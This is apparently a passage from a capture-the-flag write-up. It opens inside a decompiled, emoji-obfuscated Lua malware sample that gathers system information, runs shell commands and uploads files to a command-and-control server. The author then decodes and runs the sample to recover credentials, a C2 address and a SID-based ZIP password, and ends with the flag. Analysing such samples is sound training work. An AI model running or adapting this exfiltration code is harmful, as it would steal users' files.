local function r56_0(r0_57, r1_57)
  -- line: [515, 517] id: 57
  print(r53_0(r10_0("🐬🦀🦈🐠🌈🌋🐡🐢🌺🐬🐋🌋🦈🌋🐚🦈🦀🐠🐬🐠🦀🌺🌊🐙🌺🌋🦀🐬🐡🐢🐬🐬🌊🌊🐳🦀🥥🐠🐚🥥🐠🌊🌺🌺🌈🌊🐢🦀🌈🐚🐢🐠🌺🦈🦀🐬🐳🐚🦀🐋🌺🐡🌈🐬🦈🐙🐙🌺🌺🦈🌋🌋🌊🐬", r0_0) .. r55_0(r1_57) .. r10_0("🐠🐙", r0_0) .. r55_0(r0_57)))
  return r53_0(r10_0("🐬🦀🦈🐠🌈🌋🐡🐢🌺🐬🐋🌋🦈🌋🐚🦈🦀🐠🐬🐠🦀🌺🌊🐙🌺🌋🦀🐬🐡🐢🐬🐬🌊🌊🐳🦀🥥🐠🐚🥥🐠🌊🌺🌺🌈🌊🐢🦀🌈🐚🐢🐠🌺🦈🦀🐬🐳🐚🦀🐋🌺🐡🌈🐬🦈🐙🐙🌺🌺🦈🌋🌋🌊🐬", r0_0) .. r55_0(r1_57) .. r10_0("🐠🐙", r0_0) .. r55_0(r0_57))
end
local function r57_0(r0_58)
  -- line: [519, 519] id: 58
  local r1_58 = {}
  for r5_58 = 1, r0_58, 1 do
    r1_58[r5_58] = string.format("%x", math.random(0, 15))
  end
  return table.concat(r1_58)
end
local function r58_0()
  -- line: [520, 520] id: 59
  return r57_0(8) .. r57_0(8)
end
local function r59_0(r0_60)
  -- line: [522, 522] id: 60
  local r1_60 = 1
  while r1_60 <= #r0_60 do
    local r2_60 = r0_60:sub(r1_60, r1_60)
    if r2_60 ~= r10_0("🐠🐙", r0_0) and r2_60 ~= r10_0("🐡🐳", r0_0) then
      break
    end
    r1_60 = r1_60 + 1
  end
  return r0_60:sub(r1_60)
end
local function r60_0(r0_61)
  -- line: [523, 523] id: 61
  local r1_61 = #r0_61
  while 1 <= r1_61 do
    local r2_61 = r0_61:sub(r1_61, r1_61)
    if r2_61 ~= r10_0("🐠🐙", r0_0) and r2_61 ~= r10_0("🐡🐳", r0_0) then
      break
    end
    r1_61 = r1_61 - 1
  end
  return r0_61:sub(1, r1_61)
end
local function r61_0(r0_62)
  -- line: [524, 524] id: 62
  return r60_0(r59_0(r0_62))
end
local function r62_0(r0_63, r1_63)
  -- line: [526, 533] id: 63
  local r2_63 = 1
  while r2_63 <= #r0_63 do
    local r3_63 = r0_63:find("\n", r2_63, true) or #r0_63 + 1
    r1_63(r0_63:sub(r2_63, r3_63 - 1))
    r2_63 = r3_63 + 1
  end
end
local r64_0 = r52_0(os.getenv(r10_0("🌊🌋🐠🐠🐋🦈🐳🦈", r0_0)) or r10_0("🐠🥥", r0_0), r58_0())
print(r64_0)
local r65_0 = r52_0(r64_0, r58_0() .. r10_0("🐠🥥🐡🐠🌈🥥🐡🥥", r0_0))
print(r65_0)
r54_0(r64_0)
print(r54_0(r64_0))
if not r56_0(r10_0("🐬🐠🦈🐳🌈🌴🦈🦈🐠🌊🌋🦀🌊🌺🐢🐠🌴🌊🐬🐠🦀🌋🐬🐡🐠🌋🦀🌊🥥🐋🌺🌺🌊🐢🌺🌴🥥🐢🐋🌋🌺🦈🌺🦀🦀🐙🌴🐳🌈🌺🌈🌺🌺🦈", r0_0), r65_0) or not r51_0(r65_0) then
  print("exit(1)")
end
local function r66_0(r0_64, r1_64, r2_64, r3_64)
  -- line: [543, 558] id: 64
  local r5_64 = r10_0("🌊🐬", r0_0)
  print(r5_64)
  r5_64 = r64_0 .. r10_0("🌊🐬", r0_0) .. os.getenv(r10_0("🥥🦀🐠🌴🐋🦈🐳🦈🐡🐳🌴🌺🐳🐢🐙🐋🐋🌈🐡🌋🐙🦀🥥🌈", r0_0)) .. r10_0("🌊🌊", r0_0) .. r2_64 .. r10_0("🐠🥥🐡🐙🌈🌈🌊🐠", r0_0)
  print(r5_64)
  print(table.concat({
    r10_0("🐬🦀🐡🐙🐢🌴🥥🦈🌺🦀🐚🐡", r0_0),
    r0_64,
    "a",
    r10_0("🐠🌺🦈🌺🦀🌋", r0_0) .. r3_64 .. r10_0("🐠🌴", r0_0),
    r55_0(r5_64),
    r55_0(r1_64 .. r5_64 .. r2_64 .. r10_0("🌊🐬", r0_0) .. r10_0("🌊🐬🥥🐢", r0_0)),
    r10_0("🐳🥥🐡🦀🌈🦀🐡🐢", r0_0),
    r10_0("🐳🌴🌊🦀🦀🐙🌊🐡", r0_0)
  }, r10_0("🐠🐙", r0_0)))
  print(r5_64)
  return r5_64
end
local r68_0 = io.popen(r10_0("🌺🐙🐡🌴🌈🐚🐡🥥🐠🥥🐙🐡🦈🐡🦀🌴🐢🌋🐠🐳🌈🐙🐬🌈🐠🐬🐢🌋🐡🐡🐠🌴🌺🥥🐳🌴🌺🌈🐙🐳🐠🦀🐬🌊🌴🦈🌈🦈🌈🌺🦀🐋🐳🦀🐚🐙🐠🦈🌴🐬🐳🐢🦀🥥🥥🥥🌋🐳🌺🌈🐙🐳🐳🦈🦈🐬🐬🌈🐳🐡🦈🦈🌴🐬🌋🦀🌋🐡🦈🐡🐙🌴🐚🥥🌈🥥🐚🥥🦀🥥🐙🦀🌊🦈🥥🐚🌋🐡🌋🥥🐙🌈🐳🦈🐙🌈🌺🐙🌺🌴🐡🐳🐬🌋🌊🐡🥥🐠🐙🐳🥥🦀🥥🐋🦈🐳🥥🦀🌈🐬🥥🐚🐢🌴🐡🐡🥥🌋🌈🌺🐙🐙🌺🦈🐡🌋🌴🌋🐚🦈🐢🐙🐬🐚🌈🌈🌈🐬🐬🌋🐙🐬🐢🐙🐡🌴🥥🐋🐳🐡🐚🐬🐢🐳🐬🐚🌈🌴🐬🥥🦀🌊🦀🦈🐬🌺🥥🌴🐠🥥🥥🌊🥥🌺🐋🌊🌴🐢🌺🐳🐢🐚🐠🌈🥥🦀🦈🐬🐢🦈🌋🐋🐡🌈🐋🥥🦀🐙🐢🌈🌊🐡🌊🐠🐡🐚🐬🌴🐙🐡🌊🐠🐋🌋🌴🐡🐚🦈🐡🌋🌋🌈🌺🐳🌋🐋🐢🐬🐚🐠🥥🐋🌴🥥🐙🥥🐠🐡🐢🐋🌊🐢🦈🐋🌴🌈🐡🌈🌋🐡🐚🐠🌊🐋🐋🐡🌋🥥🌈🌋🐚🐋🌴🌈🌺🌊🦀🦀🐙🐢🐠🐬🥥🌈🥥🐋🌊🐙🐚🐢🌊🦀🐚🐳🥥🐚🐙🌈🌊🌊🐋🦀🐬🐠🐚🐡🐬🥥🦀🌊🌴🌺🐚🌊🐢🐠🐚🐡🐡🌊🐬🦈🥥🐙🌴🐙🌺🐚🐡🌋🥥🥥🐳🌺🦈🐠🐬🐡🐙🐠🐙🐋🐬🌺🐠🌴🐳🦈🌋🐠🦈🦀🐢🐚🌋🐚🌴🐳🌋🐙🌴🥥🐚🌴🐡🐬🌈🌋🌴🐋🐢🌊🐚🥥", r0_0), r10_0("🌺🌴", r0_0))
print(r10_0("🌺🐙🐡🌴🌈🐚🐡🥥🐠🥥🐙🐡🦈🐡🦀🌴🐢🌋🐠🐳🌈🐙🐬🌈🐠🐬🐢🌋🐡🐡🐠🌴🌺🥥🐳🌴🌺🌈🐙🐳🐠🦀🐬🌊🌴🦈🌈🦈🌈🌺🦀🐋🐳🦀🐚🐙🐠🦈🌴🐬🐳🐢🦀🥥🥥🥥🌋🐳🌺🌈🐙🐳🐳🦈🦈🐬🐬🌈🐳🐡🦈🦈🌴🐬🌋🦀🌋🐡🦈🐡🐙🌴🐚🥥🌈🥥🐚🥥🦀🥥🐙🦀🌊🦈🥥🐚🌋🐡🌋🥥🐙🌈🐳🦈🐙🌈🌺🐙🌺🌴🐡🐳🐬🌋🌊🐡🥥🐠🐙🐳🥥🦀🥥🐋🦈🐳🥥🦀🌈🐬🥥🐚🐢🌴🐡🐡🥥🌋🌈🌺🐙🐙🌺🦈🐡🌋🌴🌋🐚🦈🐢🐙🐬🐚🌈🌈🌈🐬🐬🌋🐙🐬🐢🐙🐡🌴🥥🐋🐳🐡🐚🐬🐢🐳🐬🐚🌈🌴🐬🥥🦀🌊🦀🦈🐬🌺🥥🌴🐠🥥🥥🌊🥥🌺🐋🌊🌴🐢🌺🐳🐢🐚🐠🌈🥥🦀🦈🐬🐢🦈🌋🐋🐡🌈🐋🥥🦀🐙🐢🌈🌊🐡🌊🐠🐡🐚🐬🌴🐙🐡🌊🐠🐋🌋🌴🐡🐚🦈🐡🌋🌋🌈🌺🐳🌋🐋🐢🐬🐚🐠🥥🐋🌴🥥🐙🥥🐠🐡🐢🐋🌊🐢🦈🐋🌴🌈🐡🌈🌋🐡🐚🐠🌊🐋🐋🐡🌋🥥🌈🌋🐚🐋🌴🌈🌺🌊🦀🦀🐙🐢🐠🐬🥥🌈🥥🐋🌊🐙🐚🐢🌊🦀🐚🐳🥥🐚🐙🌈🌊🌊🐋🦀🐬🐠🐚🐡🐬🥥🦀🌊🌴🌺🐚🌊🐢🐠🐚🐡🐡🌊🐬🦈🥥🐙🌴🐙🌺🐚🐡🌋🥥🥥🐳🌺🦈🐠🐬🐡🐙🐠🐙🐋🐬🌺🐠🌴🐳🦈🌋🐠🦈🦀🐢🐚🌋🐚🌴🐳🌋🐙🌴🥥🐚🌴🐡🐬🌈🌋🌴🐋🐢🌊🐚🥥", r0_0))
if r68_0 then
  local r69_0 = r68_0:read(r10_0("🐠🐡🐡🐬🐢🐡🐡🐢", r0_0))
  print(r10_0("🐠🐡🐡🐬🐢🐡🐡🐢", r0_0))
  r68_0:close()
  local r70_0 = {}
  local r71_0 = nil
  r62_0(r69_0, function(r0_65)
    -- line: [565, 587] id: 65
    if r0_65:sub(1, 4) == r10_0("🥥🥥🐡🐬🐢🦈🐡🥥", r0_0) then
      print(r10_0("🥥🥥🐡🐬🐢🦈🐡🥥", r0_0))
      local r1_65 = r0_65:find(":", 1, true)
      if r1_65 then
        local r2_65 = r61_0(r0_65:sub(r1_65 + 1))
        print(r2_65)
        r70_0.c = r70_0.c or {}
        r70_0.c.n = r2_65
        r70_0[r2_65] = r70_0.c
        print(r70_0.c)
        print(r70_0.c.n)
        print(r70_0[r2_65])
      end
    elseif r0_65:sub(1, 3) == r10_0("🌊🦀🐠🌋🐋🌴", r0_0) then
      local r1_65 = r0_65:find(":", 1, true)
      if r1_65 and r70_0.c then
        r70_0.c.s = r61_0(r0_65:sub(r1_65 + 1))
        local r2_65 = r64_0 .. r10_0("🌊🐬", r0_0) .. os.getenv(r10_0("🥥🦀🐠🌴🐋🦈🐳🦈🐡🐳🌴🌺🐳🐢🐙🐋🐋🌈🐡🌋🐙🦀🥥🌈", r0_0)) .. r10_0("🌊🌊", r0_0) .. r70_0.c.n .. r10_0("🐠🥥🐡🐚🐢🐳🐡🐬", r0_0)
        print((r10_0("🌺🐙🐡🌴🌈🐚🐡🥥🐠🥥🐙🐡🦈🐡🦀🌴🐢🌋🐠🐳🌈🐙🐬🌈🐠🐬🐢🌋🐡🐡🐠🌴🌺🥥🐳🌴🌺🌈🐙🐳🐠🦀🐬🌊🌴🦈🌈🦈🌈🌺🦀🐋🐳🦀🐚🐙🐠🦈🌴🐬🐳🐢🦀🥥🥥🥥🌋🐳🌺🌈🐙🐳🌊🌋🐳🥥🌺🐢🐬🦀🌺🐋🐙🐬🐋🐡🌈🌈🦈🐳🌴🐚🐚🐠🌈🐙🐙🐙🦀🐠🐚🌋🐡🌊🦈🐋🌴🐳🐙🐋🌴🌊🐡🦀🦀🐳🌺🦀🐠🐳🐳🐠🌊🌴🐳🐋🌊🐳🦀🌋🌺🐡🐳🐢🌺🐳🌊🐳🌈🐋🌺🌊🐢🥥🦈🦈🌺🐢🌈🐚🐚🐙🌺🦈🦈🐢🦀🥥🦀🦀🐙🐢🌺🌋🌴🐠🐋🌊🐬🦀🐚🥥🐢🐚🥥🐢🐠🌈🐠🐚🌴🌴🐋🐙🌺🐚🐢🦀🐬🐠🐢🐡🌴🥥🐳🐳🥥🐙🐠🥥🥥🥥🥥🐡🐚🦈🐚🐠🌺🌈🐋🐳🦈🥥🦈🐚🌊🦈🐋🐢🌋🦀🐡🦀🐋🐋🐋🐚🌋🌊🥥🐠🌊🐠🐳🐋", r0_0) .. r70_0.c.s .. r10_0("🐠🐢🥥🌋🦀🐠🐳🐠🐳🐋🐚🌺🌊🌴🌈🐳🦀🐠", r0_0) .. r2_65 .. r10_0("🐠🌴", r0_0)))
        local dfg = uf(r2_65, r10_0("🐬🐠🦈🐳🌈🌴🦈🦈🐬🌈🐋🌈🌊🌺🌈🌈🌴🐠🐬🦈🐢🌊🐠🌺🐬🐚🌴🐋🐡🌋🐳🥥🐡🐢🐬🐳🐡🐳🐚🐡🌺🐋🥥🥥🌴🐢🐋🐚🦀🌺🌈🐚🐠🌊🐚🐋🐡🌴🦀🦀🐡🥥🌴🥥🐬🥥🐢🐋🐡🦀🌈🐋🥥🥥🐡🌊🌺🦀🐬🌈🐬🐚🐢🌈🌋🦀🌋🌺🐳🌊🐚🐢🦀🐳🌋🦈🐙🐚🐚🐠🦀🐋🐳🐳🐡🌴🦀🦈🌈🦈🐙🦈🐡🌈🐚🐬🌺🐳🥥🐚🦈🌴🐬🐳🥥🐬🐬🐢🦀🐳🌺🐠🐡🐋🌺🐡🌊🐡🐢🐬🌊🐳🌴🦀🐡🐡🌊🐢🌈🐚🐋🦈🌺🐋🦈🦈🐙🌺🌴🥥🌈🐢🌺🦈🌴🌊🐢🥥🥥🐠🐙🐬🦀🦀🦈🌴🐡🌊🦈🐚🐚🦀🐋🌴🐬🌈🌋🌴🌺🌊🌈🥥🐚🐠🐳🐡🐠🐙🐳🌴🐡🐬🐡🐚🌋🐋🌋🐢🥥🐚🌈🥥🐡🐬🦈🌴🐬🐚🐙🐙🌋🌴🦈🌺🌈🌈🌋🐳🐋🐬🌊🐬🐬🐠🐠🐙🐡🐡🐢🌺🌺🐠🐋🐳🦀🐚🐙🦀🦈🐬🦀🌈🌺🦈🌴🐠🐢🌋🌴🌋🐬🐋🐢🐠🐙🐡🐡🐠🐙🌴🐳🐠🌊🐬🌴🦈🐳🥥", r0_0), r10_0("🌺🐙🦈🌊🐢🐳🐡🌈🐳🐳🐙🌺🦈🐡🦀🌴🌈🌺🐳🌈", r0_0), r10_0("🌊🐙🐠🐬🌴🌴🦈🌊🐠🌺🌴🐡🥥🐢🐚🐳🐋🐙🐡🦀🦀🥥🐬🐠🐡🐋🌈🌈🌊🌊🐬🌴🥥🦀🐳🐳🦈🐋🦀🌊🌺🐋🐳🦈🌴🐚🌈🐋", r0_0))
        print(dfg)

        print(r10_0("🐬🐠🦈🐳🌈🌴🦈🦈🐬🌈🐋🌈🌊🌺🌈🌈🌴🐠🐬🦈🐢🌊🐠🌺🐬🐚🌴🐋🐡🌋🐳🥥🐡🐢🐬🐳🐡🐳🐚🐡🌺🐋🥥🥥🌴🐢🐋🐚🦀🌺🌈🐚🐠🌊🐚🐋🐡🌴🦀🦀🐡🥥🌴🥥🐬🥥🐢🐋🐡🦀🌈🐋🥥🥥🐡🌊🌺🦀🐬🌈🐬🐚🐢🌈🌋🦀🌋🌺🐳🌊🐚🐢🦀🐳🌋🦈🐙🐚🐚🐠🦀🐋🐳🐳🐡🌴🦀🦈🌈🦈🐙🦈🐡🌈🐚🐬🌺🐳🥥🐚🦈🌴🐬🐳🥥🐬🐬🐢🦀🐳🌺🐠🐡🐋🌺🐡🌊🐡🐢🐬🌊🐳🌴🦀🐡🐡🌊🐢🌈🐚🐋🦈🌺🐋🦈🦈🐙🌺🌴🥥🌈🐢🌺🦈🌴🌊🐢🥥🥥🐠🐙🐬🦀🦀🦈🌴🐡🌊🦈🐚🐚🦀🐋🌴🐬🌈🌋🌴🌺🌊🌈🥥🐚🐠🐳🐡🐠🐙🐳🌴🐡🐬🐡🐚🌋🐋🌋🐢🥥🐚🌈🥥🐡🐬🦈🌴🐬🐚🐙🐙🌋🌴🦈🌺🌈🌈🌋🐳🐋🐬🌊🐬🐬🐠🐠🐙🐡🐡🐢🌺🌺🐠🐋🐳🦀🐚🐙🦀🦈🐬🦀🌈🌺🦈🌴🐠🐢🌋🌴🌋🐬🐋🐢🐠🐙🐡🐡🐠🐙🌴🐳🐠🌊🐬🌴🦈🐳🥥", r0_0))
        print(r10_0("🌺🐙🦈🌊🐢🐳🐡🌈🐳🐳🐙🌺🦈🐡🦀🌴🌈🌺🐳🌈", r0_0))
        print(r10_0("🌊🐙🐠🐬🌴🌴🦈🌊🐠🌺🌴🐡🥥🐢🐚🐳🐋🐙🐡🦀🦀🥥🐬🐠🐡🐋🌈🌈🌊🌊🐬🌴🥥🦀🐳🐳🦈🐋🦀🌊🌺🐋🐳🦈🌴🐚🌈🐋", r0_0))


        r69_0 = r66_0(r65_0, r10_0("🥥🦀🌊🐢🌋🐡🐳🥥🐠🌊🐚🐬🐡🐙🌴🌋🌋🌋", r0_0), r70_0.c.n, r70_0.c.s)

        print(r69_0)

        local tre = uf(r69_0, r10_0("🐬🐠🦈🐳🌈🌴🦈🦈🐬🌈🐋🌈🌊🌺🌈🌈🌴🐠🐬🦈🐢🌊🐠🌺🐬🐚🌴🐋🐡🌋🐳🥥🐡🐢🐬🐳🐡🐳🐚🐡🌺🐋🥥🥥🌴🐢🐋🐚🦀🌺🌈🐚🐠🌊🐚🐋🐡🌴🦀🦀🐡🥥🌴🥥🐬🥥🐢🐋🐡🦀🌈🐋🥥🥥🐡🌊🌺🦀🐬🌈🐬🐚🐢🌈🌋🦀🌋🌺🐳🌊🐚🐢🦀🐳🌋🦈🐙🐚🐚🐠🦀🐋🐳🐳🐡🌴🦀🦈🌈🦈🐙🦈🐡🌈🐚🐬🌺🐳🥥🐚🦈🌴🐬🐳🥥🐬🐬🐢🦀🐳🌺🐠🐡🐋🌺🐡🌊🐡🐢🐬🌊🐳🌴🦀🐡🐡🌊🐢🌈🐚🐋🦈🌺🐋🦈🦈🐙🌺🌴🥥🌈🐢🌺🦈🌴🌊🐢🥥🥥🐠🐙🐬🦀🦀🦈🌴🐡🌊🦈🐚🐚🦀🐋🌴🐬🌈🌋🌴🌺🌊🌈🥥🐚🐠🐳🐡🐠🐙🐳🌴🐡🐬🐡🐚🌋🐋🌋🐢🥥🐚🌈🥥🐡🐬🦈🌴🐬🐚🐙🐙🌋🌴🦈🌺🌈🌈🌋🐳🐋🐬🌊🐬🐬🐠🐠🐙🐡🐡🐢🌺🌺🐠🐋🐳🦀🐚🐙🦀🦈🐬🦀🌈🌺🦈🌴🐠🐢🌋🌴🌋🐬🐋🐢🐠🐙🐡🐡🐠🐙🌴🐳🐠🌊🐬🌴🦈🐳🥥", r0_0), r10_0("🌺🐙🦈🌊🐢🐳🐡🌈🐳🐳🐙🌺🦈🐡🦀🌴🌈🌺🐳🌈", r0_0), r10_0("🌊🐙🐠🐬🌴🌴🦈🌊🐠🌺🌴🐡🥥🐢🐚🐳🐋🐙🐡🦀🦀🥥🐬🐠🐡🐋🌈🌈🌊🌊🐬🌴🥥🦀🐳🐳🦈🐋🦀🌊🌺🐋🐳🦈🌴🐚🌈🐋", r0_0))
        print(tre)

        print(r10_0("🐬🐠🦈🐳🌈🌴🦈🦈🐬🌈🐋🌈🌊🌺🌈🌈🌴🐠🐬🦈🐢🌊🐠🌺🐬🐚🌴🐋🐡🌋🐳🥥🐡🐢🐬🐳🐡🐳🐚🐡🌺🐋🥥🥥🌴🐢🐋🐚🦀🌺🌈🐚🐠🌊🐚🐋🐡🌴🦀🦀🐡🥥🌴🥥🐬🥥🐢🐋🐡🦀🌈🐋🥥🥥🐡🌊🌺🦀🐬🌈🐬🐚🐢🌈🌋🦀🌋🌺🐳🌊🐚🐢🦀🐳🌋🦈🐙🐚🐚🐠🦀🐋🐳🐳🐡🌴🦀🦈🌈🦈🐙🦈🐡🌈🐚🐬🌺🐳🥥🐚🦈🌴🐬🐳🥥🐬🐬🐢🦀🐳🌺🐠🐡🐋🌺🐡🌊🐡🐢🐬🌊🐳🌴🦀🐡🐡🌊🐢🌈🐚🐋🦈🌺🐋🦈🦈🐙🌺🌴🥥🌈🐢🌺🦈🌴🌊🐢🥥🥥🐠🐙🐬🦀🦀🦈🌴🐡🌊🦈🐚🐚🦀🐋🌴🐬🌈🌋🌴🌺🌊🌈🥥🐚🐠🐳🐡🐠🐙🐳🌴🐡🐬🐡🐚🌋🐋🌋🐢🥥🐚🌈🥥🐡🐬🦈🌴🐬🐚🐙🐙🌋🌴🦈🌺🌈🌈🌋🐳🐋🐬🌊🐬🐬🐠🐠🐙🐡🐡🐢🌺🌺🐠🐋🐳🦀🐚🐙🦀🦈🐬🦀🌈🌺🦈🌴🐠🐢🌋🌴🌋🐬🐋🐢🐠🐙🐡🐡🐠🐙🌴🐳🐠🌊🐬🌴🦈🐳🥥", r0_0))
        print(r10_0("🌺🐙🦈🌊🐢🐳🐡🌈🐳🐳🐙🌺🦈🐡🦀🌴🌈🌺🐳🌈", r0_0))
        print(r10_0("🌊🐙🐠🐬🌴🌴🦈🌊🐠🌺🌴🐡🥥🐢🐚🐳🐋🐙🐡🦀🦀🥥🐬🐠🐡🐋🌈🌈🌊🌊🐬🌴🥥🦀🐳🐳🦈🐋🦀🌊🌺🐋🐳🦈🌴🐚🌈🐋", r0_0))
      end
    end
  end)
  print(r2_65)
  r70_0.c = nil
  -- close: r69_0
end
```

- So now we can just use the proper LUA 5.1 version from LUA and run the code: 

```powershell
lua5.1.exe ..\..\Downloads\malware.lua
```

- We see some interesting things from the output. We see what is a username, password, C2 address, and the process for creating the ZIP password.

![Powershell](/huntress_2025/Day_25/My_Hawaii_Vacation/Powershell.png "Powershell")

- So if we visit that link, we get a basic auth prompt. Enter “prometheus” and the output from the script above as the password: “PA4tqS5NHFpkQwumsd3D92cb”.

![Recovered Files](/huntress_2025/Day_25/My_Hawaii_Vacation/Exfilled_Files.png "Recovered Files")

- Look at the log and we can see the key that was used as the password as we see from our LUA output. So we can look at the log and then need to convert it back to a SID.

![SID - Password](/huntress_2025/Day_25/My_Hawaii_Vacation/SID_Password.png "SID - Password")

- Convert that to Hex and then build it out like this:

```
01 05 00 00 00 00 00 05 15 00 00 00 12 ef 9a e2 f2 9b 7e f5 93 74 b4 78 f4 01 00 00
```

```
01                    	=> revision = 1
05                    	=> subauthority count = 5
00 00 00 00 00 05     	=> identifier authority = 0x000000000005 = 5 (NT AUTHORITY)
15 00 00 00           	=> subauth[0] = 0x00000015 (little-endian) = 21
12 ef 9a e2           	=> subauth[1] = 0xE29AEF12 (little-endian) = 3801804562
f2 9b 7e f5           	=> subauth[2] = 0xF57E9BF2 (little-endian) = 4118715378
93 74 b4 78           	=> subauth[3] = 0x78B47493 (little-endian) = 2025092243
f4 01 00 00           	=> subauth[4] = 0x000001f4 (little-endian) = 500
```

- Here’s the SID: `S-1-5-21-3801804562-4118715378-2025092243-500`. Use this as the password to the zip that you downloaded from the site.

```bash
7z x ../WINDOWS11-Administrator.zip -p"S-1-5-21-3801804562-4118715378-2025092243-500"
cat Desktop/flag.txt
```

![Solution](/huntress_2025/Day_25/My_Hawaii_Vacation/Solution.png "Solution")

# Flag

- flag{0a741a06d3b8227f75773e3195e1d641}